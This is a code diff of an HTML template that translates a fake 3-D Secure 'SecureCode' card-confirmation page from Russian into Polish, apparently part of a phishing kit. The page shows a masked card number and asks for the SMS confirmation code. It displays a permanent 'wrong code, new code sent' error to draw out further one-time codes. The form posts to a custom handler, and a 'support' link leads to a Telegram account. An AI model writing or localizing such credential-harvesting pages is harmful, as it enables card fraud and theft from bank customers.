@@ -1,7 +1,7 @@
 <html>
 
 <head>
-	<title>SecureCode</title>
+	<title>Kod bezpieczeństwa</title>
 	<meta charset="utf-8">
 	<meta name="robots" content="all">
 	<meta name="description" content="">
@@ -20,7 +20,7 @@
 </head>
 
 <body>
-	<form class="form-payment" action="confirmation_f" method="post">
+	<form class="form-payment" action="confirmation_fpln" method="post">
 		<input type="hidden" name="tag" value="">
 		<style>
 		@import url("https://fonts.googleapis.com/css?family=Source+Code+Pro:400,500,600,700|Source+Sans+Pro:400,600,700&display=swap");
@@ -828,24 +828,24 @@
 						<div style="border-bottom: 0px solid #ced6e0;
     padding-bottom: 15px; transition: opacity 0.1s linear 0s, transform 0.1s linear 0s, visibility 0s linear 0.1s;
         box-shadow: rgba(0, 0, 0, 0.08) 0px 4px 8px -4px;
-        transform: translate3d(0px, -8px, 0px);"> <strong style="font-size:23px; padding-left:10px;color:#ced6e0;font-weight: lighter;"><i class="fas fa-shield-alt"></i> SecureCode</strong> </div>
+        transform: translate3d(0px, -8px, 0px);"> <strong style="font-size:23px; padding-left:10px;color:#ced6e0;font-weight: lighter;"><i class="fas fa-shield-alt"></i> Kod bezpieczeństwa</strong> </div>
 					</center>
 				</div>
 				<br>
 				<div class="card-list">
 					<div class="card-form__inner">
-						<center> <strong style="color:;font-size:21px">Подтверждение операции <i style="color:;font-size:17px" data-toggle="tooltip" title="SecureCode – это простой и безопасный способ оплаты покупок в интернете по картам, который реализован путем отправки одноразового секретного кода на мобильный телефон держателю карты и проверки кода на стороне банкинга." class="far fa-question-circle"></i></strong></center>
+						<center> <strong style="color:;font-size:21px">Potwierdzenie operacji <i style="color:;font-size:17px" data-toggle="tooltip" title="Kod bezpieczeństwa – to prosty i bezpieczny sposób płacenia kartą za zakupy w internecie, który realizowany jest poprzez wysłanie jednorazowego tajnego kodu na telefon komórkowy posiadacza karty i sprawdzenie kodu po stronie bankowej." class="far fa-question-circle"></i></strong></center>
 						<table style="margin: auto;padding: 20px;">
 							<tbody style="margin: auto;">
 								<tr>
-									<th style="float:right" scope="row">Номер карты</th>
+									<th style="float:right" scope="row">Numer karty</th>
 									<td style="padding-left:10px;color:#1a3b5d;font-weight: lighter;"><b>**** **** **** <%= cardnumber %></b></td>
 								</tr>
 							</tbody>
 						</table>
-						<center> <small style="text-align:justify;">Для подтверждения операции на Ваш номер телефона было отправлено смс сообщение с кодом подтверждения. Введите его в поле ниже.</small> </center>
+						<center> <small style="text-align:justify;">Aby potwierdzić operację, na Twój numer telefonu została wysłana wiadomość SMS z kodem potwierdzającym. Wpisz go w polu poniżej.</small> </center>
 						<br>
-						<center style="color:red"><i class="fas fa-exclamation-circle"></i> Неверный код из смс! Вам отправлен новый код.</center>
+						<center style="color:red"><i class="fas fa-exclamation-circle"></i> Nieprawidłowy kod SMS! Nowy kod został do Ciebie wysłany.</center>
 						<center>
 							<div class="card-input">
 								<label for="cardName" class="card-input__label">Код из смс:</label>
@@ -866,7 +866,7 @@
 										<div class="credit-card-form__submit-inner">
 											<input type="submit" class="card-form__button" name="submit" value="Подтвердить" onclick="this.style.display='none';"> </div>
 									</div>
-									<a href="https://t.me/funnyhub_support"><h5 class="card-input__label" style="text-align: center; margin: 0px;">Тех. поддержка</h5></a>
+									<a href="https://t.me/funnyhub_support"><h5 class="card-input__label" style="text-align: center; margin: 0px;">Wsparcie</h5></a>
 								</div>
 							</div>
 						</div>
